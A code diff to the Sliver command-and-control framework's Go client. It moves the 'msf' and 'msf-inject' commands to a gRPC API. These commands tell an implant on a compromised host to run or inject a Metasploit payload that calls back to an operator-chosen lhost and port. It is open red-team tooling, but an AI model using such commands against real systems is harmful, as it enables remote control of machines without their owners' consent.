@@ -19,31 +19,30 @@ package command
 */
 
 import (
+	"context"
 	"fmt"
 
 	consts "github.com/bishopfox/sliver/client/constants"
-	clientpb "github.com/bishopfox/sliver/protobuf/client"
-	sliverpb "github.com/bishopfox/sliver/protobuf/sliver"
+	"github.com/bishopfox/sliver/protobuf/clientpb"
+	"github.com/bishopfox/sliver/protobuf/rpcpb"
 
 	"github.com/bishopfox/sliver/client/spin"
 
 	"github.com/desertbit/grumble"
-	"github.com/golang/protobuf/proto"
 )
 
-func msf(ctx *grumble.Context, rpc RPCServer) {
+func msf(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
+
+	session := ActiveSession.GetInteractive()
+	if session == nil {
+		return
+	}
 
 	payloadName := ctx.Flags.String("payload")
 	lhost := ctx.Flags.String("lhost")
 	lport := ctx.Flags.Int("lport")
 	encoder := ctx.Flags.String("encoder")
 	iterations := ctx.Flags.Int("iterations")
-
-	activeSliver := ActiveSliver.Sliver
-	if activeSliver == nil {
-		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
-		return
-	}
 
 	if lhost == "" {
 		fmt.Printf(Warn+"Invalid lhost '%s', see `help %s`\n", lhost, consts.MsfStr)
@@ -52,43 +51,38 @@ func msf(ctx *grumble.Context, rpc RPCServer) {
 
 	ctrl := make(chan bool)
 	msg := fmt.Sprintf("Sending payload %s %s/%s -> %s:%d ...",
-		payloadName, activeSliver.OS, activeSliver.Arch, lhost, lport)
+		payloadName, session.OS, session.Arch, lhost, lport)
 	go spin.Until(msg, ctrl)
-	data, _ := proto.Marshal(&clientpb.MSFReq{
+	_, err := rpc.Msf(context.Background(), &clientpb.MSFReq{
+		Request:    ActiveSession.Request(ctx),
 		Payload:    payloadName,
 		LHost:      lhost,
-		LPort:      int32(lport),
+		LPort:      uint32(lport),
 		Encoder:    encoder,
 		Iterations: int32(iterations),
-		SliverID:   ActiveSliver.Sliver.ID,
 	})
-	resp := <-rpc(&sliverpb.Envelope{
-		Type: clientpb.MsgMsf,
-		Data: data,
-	}, defaultTimeout)
 	ctrl <- true
 	<-ctrl
-	if resp.Err != "" {
-		fmt.Printf(Warn+"%s\n", resp.Err)
+	if err != nil {
+		fmt.Printf(Warn+"%s\n", err)
+	} else {
+		fmt.Printf(Info + "Executed payload on target\n")
+	}
+}
+
+func msfInject(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
+
+	session := ActiveSession.GetInteractive()
+	if session == nil {
 		return
 	}
 
-	fmt.Printf(Info + "Executed payload on target\n")
-}
-
-func msfInject(ctx *grumble.Context, rpc RPCServer) {
 	payloadName := ctx.Flags.String("payload")
 	lhost := ctx.Flags.String("lhost")
 	lport := ctx.Flags.Int("lport")
 	encoder := ctx.Flags.String("encoder")
 	iterations := ctx.Flags.Int("iterations")
 	pid := ctx.Flags.Int("pid")
-
-	activeSliver := ActiveSliver.Sliver
-	if activeSliver == nil {
-		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
-		return
-	}
 
 	if lhost == "" {
 		fmt.Printf(Warn+"Invalid lhost '%s', see `help %s`\n", lhost, consts.MsfInjectStr)
@@ -102,27 +96,22 @@ func msfInject(ctx *grumble.Context, rpc RPCServer) {
 
 	ctrl := make(chan bool)
 	msg := fmt.Sprintf("Injecting payload %s %s/%s -> %s:%d ...",
-		payloadName, activeSliver.OS, activeSliver.Arch, lhost, lport)
+		payloadName, session.OS, session.Arch, lhost, lport)
 	go spin.Until(msg, ctrl)
-	data, _ := proto.Marshal(&clientpb.MSFInjectReq{
+	_, err := rpc.MsfRemote(context.Background(), &clientpb.MSFRemoteReq{
+		Request:    ActiveSession.Request(ctx),
 		Payload:    payloadName,
 		LHost:      lhost,
-		LPort:      int32(lport),
+		LPort:      uint32(lport),
 		Encoder:    encoder,
 		Iterations: int32(iterations),
-		PID:        int32(pid),
-		SliverID:   ActiveSliver.Sliver.ID,
+		PID:        uint32(pid),
 	})
-	resp := <-rpc(&sliverpb.Envelope{
-		Type: clientpb.MsgMsfInject,
-		Data: data,
-	}, defaultTimeout)
 	ctrl <- true
 	<-ctrl
-	if resp.Err != "" {
-		fmt.Printf(Warn+"%s\n", resp.Err)
-		return
+	if err != nil {
+		fmt.Printf(Warn+"%s\n", err)
+	} else {
+		fmt.Printf(Info + "Executed payload on target\n")
 	}
-
-	fmt.Printf(Info + "Executed payload on target\n")
 }
